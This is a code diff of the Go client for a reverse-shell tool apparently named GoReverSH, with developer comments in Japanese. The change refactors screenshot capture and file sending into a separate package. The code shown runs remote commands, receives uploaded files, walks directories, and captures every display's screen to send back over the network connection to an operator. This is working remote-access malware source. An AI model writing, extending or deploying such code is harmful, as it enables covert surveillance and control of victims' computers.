@@ -2,7 +2,9 @@ package main
 
 import (
 	"GoReverSH/config"
+	"GoReverSH/pkgclient"
 	"GoReverSH/utils"
+
 	"bytes"
 	"crypto/rand"
 	"crypto/tls"
@@ -11,7 +13,6 @@ import (
 	"errors"
 	"flag"
 	"fmt"
-	"image/png"
 	"io"
 	"io/fs"
 	"log"
@@ -22,8 +23,6 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
-
-	"github.com/kbinani/screenshot"
 )
 
 type Option struct {
@@ -55,51 +54,6 @@ func padString(source string, toLength int) string {
 	return source
 }
 
-//TODO outputDirを指定
-//スクリーンショットを撮影
-//conn net.Conn
-func getscreenshot() ([]string, error) {
-	n := screenshot.NumActiveDisplays()
-	filenames := []string{}
-	var fpth string
-	for i := 0; i < n; i++ {
-		bounds := screenshot.GetDisplayBounds(i)
-
-		img, err := screenshot.CaptureRect(bounds)
-		if err != nil {
-			return nil, err
-		}
-		/*
-			if runtime.GOOS == "windows" {
-				fpth = `C:\Windows\Temp\`
-			} else {
-				fpth = `/tmp/`
-			}
-		*/
-		//fpth = "./screenshot/"
-		fpth = config.Config.ScreenshotDir
-		if _, err := os.Stat(fpth); os.IsNotExist(err) {
-			if err2 := os.MkdirAll(fpth, 0755); err2 != nil {
-				log.Fatalf("Could not create the path %s", fpth)
-			}
-		}
-		fileName := fmt.Sprintf("Scr-%d-%dx%d.png", i, bounds.Dx(), bounds.Dy())
-		fullpath := filepath.Join(fpth, fileName)
-		filenames = append(filenames, fullpath)
-		file, err := os.Create(fullpath)
-		if err != nil {
-			return nil, err
-		}
-
-		defer file.Close()
-		png.Encode(file, img)
-		//png.Encode(conn, img)
-
-		//fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
-	}
-	return filenames, nil
-}
-
 func runShell(conn net.Conn) error {
 	defer conn.Close()
 
@@ -125,6 +79,7 @@ func runShell(conn net.Conn) error {
 			os.Chdir(string(dir))
 
 		case "upload":
+			//upload
 			filePath := strings.Split(commands[len(commands)-1], "/")
 			lastPathFromRecievedFile := strings.Join(filePath[:len(filePath)-1], "/")
 			//dir := "upload/"
@@ -143,7 +98,6 @@ func runShell(conn net.Conn) error {
 			buf := make([]byte, 1024)
 			//読み込む位置
 			size := 0
-			//fmt.Printf("%p\n", content)
 
 			for {
 				//ファイルを読み込む
@@ -165,7 +119,6 @@ func runShell(conn net.Conn) error {
 				}
 			}
 
-			//fmt.Println(string(content))
 			//save
 			src := filepath.Join(dir, fileName)
 			file, err := os.Create(src)
@@ -189,63 +142,13 @@ func runShell(conn net.Conn) error {
 
 		case "screenshot": //ex: screenshot
 			//スクリーンショットを撮影し送信
-			filenames, err := getscreenshot()
-			//fmt.Println(filenames)
+			outdir := config.Config.ScreenshotDir
+			filenames, err := pkgclient.Getscreenshot(outdir)
 			if err != nil {
 				continue
 			}
 
-			for _, fname := range filenames {
-				//sendfile args fname
-				f, err := os.Open(fname)
-				if err != nil {
-					break
-				}
-
-				fstats, err := f.Stat()
-				if err != nil {
-					break
-				}
-
-				filePath := strings.Split(fname, "/")
-				fileLastname := filePath[len(filePath)-1]
-
-				var content []byte
-				buff := make([]byte, 1024)
-				size := 0
-
-				for {
-					n, err := f.Read(buff)
-					if err != nil {
-						if n == 0 || errors.Is(err, io.EOF) {
-							break
-						}
-						log.Println(err)
-						break
-					}
-					//content + bufの中身を一時的に保存。
-					tmp := make([]byte, 0, size+n)
-					tmp = append(content[:size], buff[:n]...)
-					content = tmp
-					size += n
-					if n < 1024 {
-						break
-					}
-				}
-
-				imageToBase64 := base64.StdEncoding.EncodeToString(content)
-				src := filepath.Join("screenshot", fileLastname)
-				fileinfo := utils.FileInfo{Name: src, Body: []byte(imageToBase64), Size: fstats.Size()}
-
-				output := utils.Output{Type: utils.FILE, FileInfo: fileinfo}
-
-				err = json.NewEncoder(conn).Encode(output)
-				if err != nil {
-					break
-				}
-
-				f.Close()
-			}
+			pkgclient.SendFile(filenames, conn)
 
 			fmt.Println("screenshot finished")
 
@@ -311,13 +214,8 @@ func runShell(conn net.Conn) error {
 					return nil
 				}
 
-				//fmt.Println(output)
-
 				f.Close()
 
-				//create file write
-				//files = append(files, path)
-				//fmt.Println(path)
 				return nil
 			})
 			if err != nil {
@@ -349,33 +247,11 @@ func runShell(conn net.Conn) error {
 			}
 
 			output := utils.Output{Type: utils.MESSAGE, Message: out}
-			/*
-				jsonOut, err := json.Marshal(output)
-				if err != nil {
-					log.Println(err)
-					//return
-				}
-				_, err = conn.Write(jsonOut)
-				if err != nil {
-					log.Println(err)
-					//return
-				}
-			*/
 			err = json.NewEncoder(conn).Encode(output)
 			if err != nil {
 				log.Println(err)
 				return err
 			}
-
-			/*
-				//後で消す
-				fmt.Println(string(out))
-				_, err = conn.Write(out)
-				if err != nil {
-					log.Println(err)
-					return
-				}
-			*/
 		}
 	}
 
